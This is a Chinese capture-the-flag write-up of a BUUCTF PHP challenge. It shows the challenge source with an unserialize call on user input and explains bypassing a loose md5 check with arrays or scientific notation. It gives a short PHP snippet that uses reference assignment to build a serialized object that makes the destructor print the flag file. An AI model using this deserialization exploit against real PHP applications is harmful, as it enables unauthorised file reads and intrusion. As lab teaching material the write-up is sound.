### PHP & 引用相同内存

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/68775da758cb8da5c8b8c6aa.png)

打开靶场给出源码

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

md5 绕过很简单，科学计数法及数组绕过都可以

这才来到最关键的地方，如何在序列化前让 `$this->correct === $this->input`  呢？

我们创建 BUU 类后，重新给 $this->correct 赋值成 $this->input 的值

在 PHP 中，`&` 表示**引用赋值**，效果是：

 两个变量或者属性同时指向同一块内存，**任何一方变化，另一方立刻同步变化**

```php
# 让 $b1->correct 和 $b1->input 两个属性引用同一块内存地址，即：它们两个绑定为同一个变量
$b1->correct=&$b1->input;
```

```php
$b1 = new BUU();
$b1->correct=&$b1->input;
print_r(serialize($b1));
```